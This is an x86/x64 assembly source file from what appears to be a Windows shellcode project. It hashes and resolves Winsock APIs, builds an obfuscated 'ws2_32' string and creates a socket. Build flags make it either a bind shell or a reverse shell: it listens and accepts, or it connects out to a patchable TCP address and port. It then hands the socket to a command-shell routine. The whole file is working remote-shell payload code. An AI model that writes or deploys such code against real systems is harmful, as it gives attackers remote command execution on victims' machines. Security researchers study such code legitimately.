; *********************************************************************
;
;   Copyright (C) 2014 Kevin Devine - @cmpxchg8
;
;   This program is free software: you can redistribute it and/or modify
;   it under the terms of the GNU General Public License as published by
;   the Free Software Foundation, either version 3 of the License, or
;   (at your option) any later version.
;
;   This program is distributed in the hope that it will be useful,
;   but WITHOUT ANY WARRANTY; without even the implied warranty of
;   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;   GNU General Public License for more details.
;
;   You should have received a copy of the GNU General Public License
;   along with this program.  If not, see <http://www.gnu.org/licenses/>.
;
; *********************************************************************

ifdef USE_X86

; #####################################################################
;
; open or accept connections.
; eax should be zero
; esi should point to 32-bit api hashes or api strings
;
; #####################################################################
connection:

    ; alloc (GBL_STK_SIZE);
    mov    ecx, -GBL_STK_SIZE
    neg    ecx
    sub    esp, ecx
    
    ; memset (esp, 0, GBL_STK_SIZE);
    mov    edi, esp
    rep    stosb
    
    ; initialize the API addresses
    ; expects hashed api or string pointers in ESI
    ; EDI should hold value of ESP
    mov    edi, esp
    
    call   resolve_api32
    jz     exit_connection32
    
    ; LoadLibraryA ("ws2_32");
    push   not SWAP32 ("32") shr 16
    not    dword ptr[esp]
    push   SWAP32 ("ws2_")
    mov    eax, esp
    push   eax
    call   dword ptr[edi-4*4] 
    pop    ecx
    pop    ecx
    test   eax, eax
    jz     exit_connection32
    
    call   resolve_api32
    jz     exit_connection32
    
    mov    ebx, edi
    
    ; WSAStartup (MAKEWORD(2, 0), &wsa);
    mov    ecx, esp
    add    ecx, -1FFh            ; bit excessive but works
    push   ecx
    push   2                     ; MAKEWORD (2, 0)
    callx  @WSAStartup
    test   eax, eax              ; if (eax!=ERROR_SUCCESS) goto exit_connection32;
    jnz    exit_connection32

    ; s=WSASocket (AF_INET, SOCK_STREAM, IPPROTO_IP, NULL, NULL, 0);
    push   eax                   ; 0
    push   eax                   ; NULL
    push   eax                   ; NULL
    push   eax                   ; IPPROTO_IP
    push   1                     ; SOCK_STREAM
    push   2                     ; AF_INET
    callx  @WSASocketA
    mov    ebp, eax
    inc    eax                   ; if (eax==INVALID_SOCKET) goto exit_connection32;
    jz     exit_connection32
    
    ; sin.sin_addr   = inet_addr (TCP_ADDR);
    ; sin.sin_port   = htons (PORT);
    ; sin.sin_family = AF_INET;
    mov    eax, not ((MHTONS(PORT) shl 16) or AF_INET)
port_nbr equ $-4
    not    eax
    stosd
    
    mov    eax, not INET (%TCP_ADDR)
ip_address equ $-4
    not    eax
    stosd
ifdef USE_BIND
    ; bind (s, &sin, sizeof (sin));
    push   16
    push   ebx
    push   ebp
    callx  @bind
    inc    eax                   ; if (eax==SOCKET_ERROR) goto close_socket;
    jz     close_socket
    
    ; listen (s, 1);
    push   eax
    push   ebp
    callx  @listen
    test   eax, eax              ; if (eax != 0) goto close_socket;
    jnz    close_socket
    
    ; s2=accept (s, 0, 0);
    push   eax
    push   eax
    push   ebp
    callx  @accept
    test   eax, eax              ; if (s2==INVALID_SOCKET) goto close_socket;
    js     close_socket
else
    ; connect (s, &sin, sizeof (sin));
    push   16
    push   ebx
    push   ebp
    callx  @connect
    test   eax, eax
    jnz    close_socket
    
    mov    eax, ebp
endif

    call   cmd32
    
ifdef USE_BIND
    push   eax
    callx  @closesocket
endif

close_socket:
    ; closesocket (s);
    push   ebp
    callx  @closesocket
exit_connection32:
    sub    esp, -GBL_STK_SIZE
    ret
    
else

  ; ###################################################################
  ;
  ; open or accept connections.
  ; eax should be zero
  ; rsi should point to 32-bit api hashes or api strings
  ;
  ; ###################################################################

    cn_stk struc
      hs      HOME_SPACE <>
      
      dwFlags QWORD ?
      g       QWORD ?
    cn_stk ends

    CN_STK_SIZE  equ ((sizeof (cn_stk) and -16) + 16) - 8 
  
connection:
    mov    r15, rsp
    and    rsp, -16              ; align by 16
    
    ; alloc (GBL_STK_SIZE);
    mov    ecx, -GBL_STK_SIZE
    neg    ecx
    sub    rsp, rcx
    
    ; memset (rsp, 0, GBL_STK_SIZE);
    push   rsp
    pop    rdi
    rep    stosb
    
    push   rsp
    pop    rdi

    add    rsp, -CN_STK_SIZE
    
    ; initialize the API addresses
    ; expects hashed api or string pointers in RSI
    ; RDI should hold value of RSP
    
    call   resolve_api64
    jz     exit_connection64
    
    ; LoadLibraryA ("ws2_32");
    mov    rdx, not SWAP64 ("ws2_32") shr 16
    not    rdx
    mov    qword ptr[rdi+0], rdx
    mov    qword ptr[rdi+8], rcx ; rcx is zero after resolve_api64
    push   rdi
    pop    rcx
    call   qword ptr[rdi-4*8]
    test   rax, rax
    jz     exit_connection64
 
    ; resolve ws2_32 api
    call   resolve_api64
    jz     exit_connection64
    
    push   rdi
    pop    rbx

    ; WSAStartup (MAKEWORD(2, 0), &wsa);
    push   rbx
    pop    rdx
    mov    cl, 2                 ; rcx is zero after resolve_api64
    callx  @WSAStartup
    test   eax, eax
    jnz    exit_connection64
    
    push   rdi
    pop    rbx
                                 ; rax is zero after previous call
    mov    [rsp][cn_stk.dwFlags], rax
    mov    [rsp][cn_stk.g      ], rax
    
    ; s=WSASocket (AF_INET, SOCK_STREAM, IPPROTO_IP, NULL, NULL, 0);
    xor    r9, r9
    xor    r8, r8
    cdq
    inc    edx                   ; SOCK_STREAM
    push   2                     ; AF_INET
    pop    rcx
    callx  @WSASocketA
    mov    ebp, eax
    inc    eax
    jz     exit_connection64
    
    ; sin.sin_addr   = inet_addr (TCP_ADDR);
    ; sin.sin_port   = htons (PORT);
    ; sin.sin_family = AF_INET;
    push   rbx
    pop    rdi
    mov    rax, not ((INET (%TCP_ADDR) shl 32) or ((MHTONS(PORT) shl 16) or AF_INET))

port_nbr   equ $-4
ip_address equ $-8

    not    rax
    stosq

  ifdef USE_BIND
    ; bind (s, &sin, sizeof (sin));
    push   16
    pop    r8
    push   rbx
    pop    rdx
    push   rbp
    pop    rcx
    callx  @bind
    inc    eax
    jz     close_socket
    
    ; listen (s, 1);
    xchg   eax, edx
    push   rbp
    pop    rcx
    callx  @listen
    test   eax, eax
    jnz    close_socket
    
    ; s2=accept (s, 0, 0);
    xor    r8, r8
    cdq
    push   rbp
    pop    rcx
    callx  @accept
    test   eax, eax
    js     close_socket
  else
    ; connect (s, &sin, sizeof (sin));
    push   16
    pop    r8
    push   rbx
    pop    rdx
    push   rbp
    pop    rcx
    callx  @connect
    test   eax, eax
    jnz    close_socket
    
    mov    eax, ebp
  endif
  
    call   cmd64
    
  ifdef USE_BIND
    xchg   eax, ecx
    callx  @closesocket
  endif

close_socket:
    ; closesocket (s);
    push   rbp
    pop    rcx
    callx  @closesocket
exit_connection64:
    mov    rsp, r15
    ret

endif